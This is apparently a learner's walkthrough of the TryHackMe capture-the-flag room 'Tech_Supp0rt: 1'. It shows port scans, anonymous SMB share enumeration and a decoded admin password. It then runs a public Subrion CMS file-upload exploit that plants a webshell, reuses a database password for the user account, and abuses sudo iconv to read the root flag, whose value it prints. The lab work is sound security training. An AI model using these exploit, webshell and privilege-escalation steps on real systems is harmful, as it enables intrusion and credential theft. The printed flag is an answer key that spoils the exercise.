<h1 align="center">Tech_Supp0rt: 1</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/464924d6-8a30-4f8d-93fe-5ca0009e684d"><br>
July 6, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>426</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Hack into the scammer's under-development website to foil their plans</em>.<br>
Access it <a href="https://tryhackme.com/room/techsupp0rt1"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/9e493cb2-3b15-4c48-9616-a8aa3ef033a0"></p>

<br>

<h2>Task 1 . Submit Flags</h2>
<p>Hack into the machine and investigate the target.<br>

Please allow about 5 minutes for the machine to fully boot!<br>

Note: The theme and security warnings encountered in this room are part of the challenge.</p>

<p><em>Answer the question below</em></p>

<br>

<h3>nmap</h3>

```bash
:~/Tech_Supp0rt# nmap -sS -sV -p- -T4 TargetIP
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

```bash
:~/Tech_Supp0rt# nmap -sC -sV -p- -T4 TargetIP
...
PORT    STATE SERVICE     VERSION
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:93:9C:93:B8:65 (Unknown)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m29s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-07-...
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07...
|_  start_date: N/A
```

<h3>rustscan</h3>

```bash
~/Tech_Supp0rt# rustscan -a TargetIP --ulimit 5500 -- -A -Pn
...
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58120/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 63991/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51235/udp): CLEAN (Timeout)
|   Check 4 (port 60029/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2025-07...
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07...
|_  start_date: N/A
```

<br>


<h3>p2p-conficker</h3>

![image](https://github.com/user-attachments/assets/2665219d-a500-483f-b621-ff928e055c31)

<p>https://nmap.org/nsedoc/scripts/p2p-conficker.html</p>

<br>


<h3>smbclient</h3>

```bash
:~/Tech_Supp0rt# smbclient -L \\TargetIP
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<h3>crackmapexec</h3>
<p>practicing ...</p>

```bash
:~/Tech_Supp0rt# crackmapexec smb 10.10.159.224 -u '' -p ''
SMB         10.10.159.224   445    TECHSUPPORT      [*] Windows 6.1 (name:TECHSUPPORT) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.159.224   445    TECHSUPPORT      [+] \: 
:~/Tech_Supp0rt# crackmapexec smb 10.10.159.224 -u '' -p '' --shares
SMB         10.10.159.224   445    TECHSUPPORT      [*] Windows 6.1 (name:TECHSUPPORT) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.159.224   445    TECHSUPPORT      [+] \: 
SMB         10.10.159.224   445    TECHSUPPORT      [*] Enumerated shares
SMB         10.10.159.224   445    TECHSUPPORT      Share           Permissions     Remark
SMB         10.10.159.224   445    TECHSUPPORT      -----           -----------     ------
SMB         10.10.159.224   445    TECHSUPPORT      print$                          Printer Drivers
SMB         10.10.159.224   445    TECHSUPPORT      websvr          READ            
SMB         10.10.159.224   445    TECHSUPPORT      IPC$                            IPC Service (TechSupport server (Samba, Ubuntu))
```

<h3>smbmap</h3>
<p>practicing ...</p>

```bash
:~/Tech_Supp0rt# smbmap -H TargetIP -u '' -p '' -R
[+] Finding open SMB ports....
[+] Guest SMB session established onTargetIP...
...
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	.                                                  
	dr--r--r--                0 Sat May 29 08:17:38 2021	.
	dr--r--r--                0 Sat May 29 08:03:47 2021	..
	fr--r--r--              273 Sat May 29 08:17:38 2021	enter.txt
	websvr                                            	READ ONLY	
	.\
	dr--r--r--                0 Sat May 29 08:17:38 2021	.
	dr--r--r--                0 Sat May 29 08:03:47 2021	..
	-r--r--r--              273 Sat May 29 08:17:38 2021	enter.txt
	IPC$                                              	NO ACCESS	IPC Service (TechSupport server (Samba, Ubuntu))
```

```bash
:~/Tech_Supp0rt# smbmap -H TargetIP -u '' -p '' -R -A 'enter.txt'
[+] IP: TargetIP:445	Name: ip-10-10-159-224.eu-west-1.compute.internal       
	.                                                  
	dr--r--r--                0 Sat May 29 08:17:38 2021	.
	dr--r--r--                0 Sat May 29 08:03:47 2021	..
[+] Match found! Downloading: websvr\\enter.txt
	fr--r--r--              273 Sat May 29 08:17:38 2021	enter.txt
```

<h3>cat ...enter.txt</h3>

![image](https://github.com/user-attachments/assets/68540ebc-9b89-49e1-bd9b-98b2fc60dfae)

```bash
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

<h3>Subrion</h3>
<p>Subrion CMS</p>

![image](https://github.com/user-attachments/assets/63459a0e-d017-4884-8cac-bc9b168d047e)

<h3>CyberChef</h3>
<p>admin:Scam2021</p>

![image](https://github.com/user-attachments/assets/e2c0ee77-d18f-401a-83e8-68c26fef9384)


<h3>dirb</h3>

```bash
:~/Tech_Supp0rt# dirsearch -u http://TargetIP
...
[xx:xx:xx] 200 -   24KB - /phpinfo.php
[xx:xx:xx] 403 -  278B  - /server-status
[xx:xx:xx] 403 -  278B  - /server-status/
[xx:xx:xx] 301 -  313B  - /test  ->  http://TargetIP/test/
[xx:xx:xx] 200 -    4KB - /test/
[xx:xx:xx] 200 -    2KB - /wordpress/wp-login.php
[xx:xx:xx] 404 -   26KB - /wordpress/
```

<h3>searchsploit</h3>

```bash
:~/Tech_Supp0rt# searchsploit Subrion
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                                                                                                   | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                                                  | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                                                                                               | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                                                                                                   | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                                                                               | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                                                                                             | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                                                                               | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting                                                                  | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                                                                                        | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                                                   | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                                | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                                         | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                                                 | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                                                                                    | php/webapps/51110.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
:~/Tech_Supp0rt# searchsploit -m php/webapps/49876.py
```

<h3>TargetIP/subrion/robots.txt</h3>

```bash
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```


<p>or</p>

```bash
:~/Tech_Supp0rt# python3 49876.py -u http://TargetIP/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://TargetIP/subrion/panel/
[+] Success!
[+] Got CSRF token: HIMTaUtulYl0qOMikPtcvPwcSvuueF6ttWLSi431
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: vzynkwgectzsbrg

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://TargetIP/subrion/panel/uploads/vzynkwgectzsbrg.phar 

$ whoami
www-data

$ pwd
/var/www/html/subrion/uploads

$ ls
rrvguuifmwiowpl.phar
vzynkwgectzsbrg.phar

...

$ ls /var/www/html
index.html
phpinfo.php
subrion
test
wordpress

$ ls /var/www/html/wordpress
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
```


```bash
$ cat /var/www/html/wordpress/wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

<p>'DB_NAME', 'wpdb' : 'DB_USER', 'support' : 'DB_PASSWORD', 'ImAScammerLOL!123!'</p>

<h3>another approach</h3>

<h3>TargetIP/subrion/panel</h3>

![image](https://github.com/user-attachments/assets/fc42cd04-8ffc-4f06-920b-23a39b4738e9)

![image](https://github.com/user-attachments/assets/eecb5b71-a07b-491a-b90b-7bf809fccb3e)

<p>admin:Scam2021</p>

![image](https://github.com/user-attachments/assets/96ffbfb5-3204-4902-94a4-af93d3c82952)

![image](https://github.com/user-attachments/assets/aa035213-43b1-48c0-95eb-67e02d213a0b)

![image](https://github.com/user-attachments/assets/44ef0909-e31a-41eb-8d43-c82d392b874b)

![image](https://github.com/user-attachments/assets/2cf2bba4-4496-441a-bbb2-9f2c0b935cb8)

<p>- navigated to http://TargetIP/subrion/uploads/rose.shell.phar</p>

![image](https://github.com/user-attachments/assets/caf79b19-6b63-4bdc-961e-077c28d25a97)


```bash
www-data@TechSupport:/home/scamsite$ ls -lah
ls -lah
total 32K
drwxr-xr-x 4 scamsite scamsite 4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 28  2021 ..
-rw------- 1 scamsite scamsite  151 May 28  2021 .bash_history
-rw-r--r-- 1 scamsite scamsite  220 May 28  2021 .bash_logout
-rw-r--r-- 1 scamsite scamsite 3.7K May 28  2021 .bashrc
drwx------ 2 scamsite scamsite 4.0K May 28  2021 .cache
-rw-r--r-- 1 scamsite scamsite  655 May 28  2021 .profile
-rw-r--r-- 1 scamsite scamsite    0 May 28  2021 .sudo_as_admin_successful
drwxr-xr-x 2 root     root     4.0K May 29  2021 websvr
www-data@TechSupport:/home/scamsite$ su scamsite
su scamsite
Password: ImAScammerLOL!123!

scamsite@TechSupport:~$
```

```bash
scamsite@TechSupport:~$ pwd
pwd
/home/scamsite
scamsite@TechSupport:~$ sudo -l
sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
scamsite@TechSupport:~$ 
```

<p><code>(ALL) NOPASSWD: /usr/bin/iconv</code></p>

<p>https://gtfobins.github.io/gtfobins/iconv/</p>

![image](https://github.com/user-attachments/assets/91f3a42d-2c18-4721-aadf-6e474535dde1)


<br>

<p>1.1. What is the root.txt flag?<br>
<code>851b8233a8c09400ec30651bd1529bf1ed02790b</code></p>

```bash
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
851b8233a8c09400ec30651bd1529bf1ed02790b  -
scamsite@TechSupport:~$ 

```

<h3>another approach</h3>

```bash
:~/Tech_Supp0rt# ssh scamsite@TargetIP
scamsite@TargetIP's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Fri May 28 23:30:20 2021
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
851b8233a8c09400ec30651bd1529bf1ed02790b  -
```


![image](https://github.com/user-attachments/assets/27cafd3b-99da-4216-93ca-712750dca76c)

<br>
<br>


![image](https://github.com/user-attachments/assets/a91d7f26-2621-435f-a3e3-f63d687c6046)

![image](https://github.com/user-attachments/assets/5faf0ece-a3e1-489f-b97a-55ea80e3f37b)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 6, 2025      | 426      |     163rd    |      5ᵗʰ     |     819ᵗʰ   |    21st    |  113,058 |    832    |     63    |

</div>

![image](https://github.com/user-attachments/assets/fdecd98b-aecc-4f9b-b4c3-85fce3f6f4e3)

![image](https://github.com/user-attachments/assets/f93b11ff-b023-42f2-a601-59ebd05e71be)

![image](https://github.com/user-attachments/assets/7237bb37-4622-41e4-9d0c-37e3846b3fee)

![image](https://github.com/user-attachments/assets/76f84a20-ef8f-4124-930b-97e7228af105)

![image](https://github.com/user-attachments/assets/80b57a28-5a54-4be3-b7fc-2e0b1e32ce7f)
